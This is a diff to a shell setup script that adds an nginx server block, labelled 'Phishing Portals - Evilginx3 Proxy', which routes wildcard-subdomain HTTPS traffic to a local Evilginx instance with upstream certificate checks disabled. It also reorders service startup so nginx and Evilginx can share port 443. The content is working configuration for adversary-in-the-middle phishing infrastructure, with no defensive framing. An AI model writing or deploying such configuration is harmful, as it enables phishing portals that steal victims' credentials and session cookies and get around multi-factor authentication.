@@ -419,6 +419,26 @@ server {
         proxy_read_timeout 86400;
     }
 }
+
+# Phishing Portals - Evilginx3 Proxy
+server {
+    listen 443 ssl;
+    http2 on;
+    server_name *.$DOMAIN;
+
+    ssl_certificate $cert_dir/fullchain.pem;
+    ssl_certificate_key $cert_dir/privkey.pem;
+
+    location / {
+        proxy_pass https://127.0.0.1:8443;
+        proxy_ssl_verify off;
+        proxy_set_header Host \$host;
+        proxy_set_header X-Real-IP \$remote_addr;
+        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
+        proxy_set_header Upgrade \$http_upgrade;
+        proxy_set_header Connection "upgrade";
+    }
+}
 EOF
 
     ln -sf "$NGINX_SITE" "$NGINX_ENABLED/"
@@ -645,12 +665,10 @@ EOF
     export DOMAIN VPS_IP EP1 EP2 EP3
     /tmp/evilginx_config.exp
     
-    # 3. Final Service Startup Order
+    # 3. Cleanup and Restore Services
     rm -f /tmp/evilginx_config.exp
+    systemctl start nginx
     systemctl restart evilginx
-    sleep 5
-    # NOTE: Nginx may fail to start here if Evilginx has bound to 0.0.0.0:443
-    systemctl start nginx || warn "Nginx failed to start. Port 443 may be occupied by Evilginx."
     
     # Verify evilginx is running
     sleep 3
